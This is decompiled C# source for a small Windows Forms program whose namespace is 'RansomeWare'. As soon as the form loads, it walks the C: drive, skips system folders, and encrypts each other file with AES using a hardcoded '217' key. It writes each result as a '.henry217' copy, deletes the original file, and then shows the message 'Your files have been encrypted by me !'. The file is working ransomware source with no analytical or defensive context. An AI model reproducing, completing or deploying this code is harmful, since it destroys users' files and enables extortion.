using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace RansomeWare;

public class Form1 : Form
{
	private IContainer cancelDisposed;

	private Label previousUri;

	public Form1()
	{
		AttachFile();
	}

	private void Uncheck(object sender, EventArgs e)
	{
	}

	private void SearchIcon(object sender, EventArgs e)
	{
		((Control)this).Hide();
		DirectoryInfo di = new DirectoryInfo("C:\\");
		bl(di);
		((Control)this).Show();
	}

	public static byte[] AESEncrypt(byte[] Data, string Key, string Vector)
	{
		byte[] array = new byte[32];
		Array.Copy(Encoding.UTF8.GetBytes(Key.PadRight(array.Length)), array, array.Length);
		byte[] array2 = new byte[16];
		Array.Copy(Encoding.UTF8.GetBytes(Vector.PadRight(array2.Length)), array2, array2.Length);
		byte[] array3 = null;
		Rijndael rijndael = Rijndael.Create();
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(array, array2), CryptoStreamMode.Write);
			cryptoStream.Write(Data, 0, Data.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch
		{
			return null;
		}
	}

	public void bl(DirectoryInfo di)
	{
		FileInfo[] files = di.GetFiles();
		foreach (FileInfo fileInfo in files)
		{
			try
			{
				if (Path.GetExtension(fileInfo.FullName) != ".sys" && Path.GetExtension(fileInfo.FullName) != ".henry217")
				{
					FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.Read);
					byte[] array = new byte[fileStream.Length];
					fileStream.Read(array, 0, (int)fileStream.Length);
					byte[] array2 = AESEncrypt(array, "217", "217");
					FileStream fileStream2 = new FileStream(fileInfo.FullName + ".henry217", FileMode.Create, FileAccess.Write);
					fileStream2.Write(array2, 0, array2.Length);
					fileStream2.Flush();
					fileStream2.Close();
					fileStream.Close();
					File.Delete(fileInfo.FullName);
				}
			}
			catch (Exception)
			{
			}
		}
		DirectoryInfo[] directories = di.GetDirectories();
		foreach (DirectoryInfo directoryInfo in directories)
		{
			try
			{
				if (directoryInfo.Name != "Windows" && directoryInfo.Name != "Program Files" && directoryInfo.Name != "Program Files (x86)" && directoryInfo.Name != "Microsoft")
				{
					bl(directoryInfo);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && cancelDisposed != null)
		{
			cancelDisposed.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void AttachFile()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0107: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		previousUri = new Label();
		((Control)this).SuspendLayout();
		((Control)previousUri).set_AutoSize(true);
		((Control)previousUri).set_Font(new Font("微软雅黑", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)previousUri).set_Location(new Point(64, 9));
		((Control)previousUri).set_Name("label1");
		((Control)previousUri).set_Size(new Size(692, 92));
		((Control)previousUri).set_TabIndex(0);
		((Control)previousUri).set_Text("Your files have been encrypted by me !\r\n\r\n");
		((Control)previousUri).add_Click((EventHandler)Uncheck);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 18f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 72));
		((Control)this).get_Controls().Add((Control)(object)previousUri);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Hello");
		((Form)this).add_Load((EventHandler)SearchIcon);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
